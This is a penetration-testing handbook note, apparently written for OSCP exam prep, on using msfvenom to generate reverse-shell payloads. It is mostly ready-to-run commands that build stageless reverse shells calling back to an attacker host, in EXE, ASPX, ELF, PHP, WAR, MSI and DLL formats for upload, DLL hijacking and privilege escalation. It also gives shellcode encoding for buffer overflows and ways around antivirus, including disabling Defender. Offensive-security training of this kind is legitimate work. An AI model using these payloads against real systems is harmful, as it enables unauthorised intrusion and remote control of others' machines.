---
title: "msfvenom"
slug: msfvenom
category: notes
handbook: oscp
tags: ["shells"]
draft: false
pubDatetime: 2026-08-03T22:49:06+03:00
modDatetime: 2026-09-09T21:52:45+03:00
description: "Metasploit's payload generator, usable entirely on its own."
---
Metasploit's payload generator, usable entirely on its own. It takes a payload name, an output format, and a callback address, and writes a file. Using it does not mean using the Metasploit console or a Meterpreter handler, and the payloads worth using here catch on plain `nc`.

Every payload in the vault that appears as a one-line `msfvenom ...` incantation is built from the same four decisions below.

## The Command Shape

```bash
msfvenom -p <payload> LHOST=KALI LPORT=<port> -f <format> -o <outfile>
```

- `-p` the payload. Names read `<platform>/<arch>/<payload>`, so `windows/x64/shell_reverse_tcp`. A missing arch means x86: `windows/shell_reverse_tcp` is 32-bit.
- `LHOST` / `LPORT` are payload options, not flags, so they take no dash and sit anywhere after `-p`. `LHOST` is the Kali VPN address, not the target.
- `-f` the output format, which is what turns one payload into an `.exe`, an `.aspx`, or a block of shellcode.
- `-o` the output file. Prefer it over redirecting, since copying binary output through a terminal corrupts it.

## Staged Against Stageless

The single most consequential choice, and it is encoded in punctuation:

| Name | Meaning |
| --- | --- |
| `shell_reverse_tcp` | **Stageless**. The whole payload is in the file. |
| `shell/reverse_tcp` | **Staged**. The file is a small stub that connects back and downloads the rest. |

An underscore is stageless, a slash is staged. A staged payload needs Metasploit's `multi/handler` waiting to serve the second stage, so catching it on `nc -lvnp` gets a connection that immediately dies with no prompt. That failure looks exactly like a broken exploit.

Use stageless unless there is a reason not to. `windows/x64/shell_reverse_tcp` and `linux/x64/shell_reverse_tcp` catch on `nc -lvnp 443` with nothing else running.

## Picking the Format

`-f` does not change the payload, only its wrapper. The format has to match how the target will consume the file:

```bash
msfvenom --list formats
```

The ones that come up:

```bash
# Windows executable, for a service binary or a straight upload-and-run
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o shell.exe

# ASP.NET, dropped into an IIS web root
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f aspx -o shell.aspx

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f elf -o shell.elf

# PHP, for an upload or an RFI
msfvenom -p php/reverse_php LHOST=KALI LPORT=443 -f raw -o shell.php

# Java web app container (Tomcat manager upload)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=443 -f war -o shell.war

# Windows installer, for a writable-service or AlwaysInstallElevated path
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f msi -o evil.msi

# DLL, for a hijackable search path
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f dll -o hijackme.dll
```

The `php/reverse_php` output needs `-f raw` and starts with `<?php`, so it is dropped in as-is.

## Finding a Payload Name

Guessing the name wastes more time than listing it:

```bash
msfvenom --list payloads | grep windows/x64 | grep reverse_tcp
msfvenom -p windows/x64/shell_reverse_tcp --list-options
```

`--list-options` prints every option the payload accepts and which are required, which is how to find out that, for example, some payloads want `RHOST` rather than `LHOST`.

## Architecture Has to Match

A 64-bit payload on a 32-bit OS fails with `CreateProcessWithTokenW Failed to create proc: 216` (`ERROR_EXE_MACHINE_TYPE_MISMATCH`) when a Potato tries to launch it: the token capture succeeds, the payload launch does not. A 32-bit payload in a 64-bit process does nothing, and the failure is silent: the file uploads, the request returns, and no connection arrives. When a payload that should work produces nothing or error 216, rebuild it with the other architecture before assuming the delivery failed.

This bites most often in two places: IIS, where an application pool can have "Enable 32-Bit Applications" set even on a 64-bit server, so `w3wp.exe` is 32-bit and `windows/x64/...` never fires; and legacy Windows (Server 2003/2008 non-R2), which is x86-only and rejects `windows/x64/...` outright. `System Type` from `systeminfo` settles it before generating anything.

## Bad Characters and Encoders

`-b` excludes bytes the delivery channel cannot carry, and `-e` picks an encoder:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=443 \
  -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -f python -v shellcode
```

This is buffer-overflow territory rather than file-upload territory: a file written to disk has no forbidden bytes, so `-b` and `-e` are unnecessary noise there. Encoders are also not AV evasion, despite the reputation; `shikata_ga_nai` is signatured. The full treatment of swapping msfvenom shellcode into a public exploit, including `-v` for the variable name and the paste-truncation trap, is in [Fixing Public Exploits](/collections/oscp/fixing-public-exploits).

## Detection

msfvenom output is among the most heavily signatured content in existence, and Defender quarantines the common formats on sight. When a generated file vanishes after upload or the process dies immediately, that is AV, not a bad payload. Options in rough order of effort: pick a format with a smaller signature footprint, use a non-Metasploit payload such as a plain `nc.exe` callback or a PowerShell download cradle, or disable Defender if the foothold already permits it. [Reverse Shells](/collections/oscp/reverse-shells) covers the non-Metasploit payloads, which are usually the faster answer on a lab box.

## Reference

- `msfvenom --list payloads`, `--list formats`, `--list encoders`
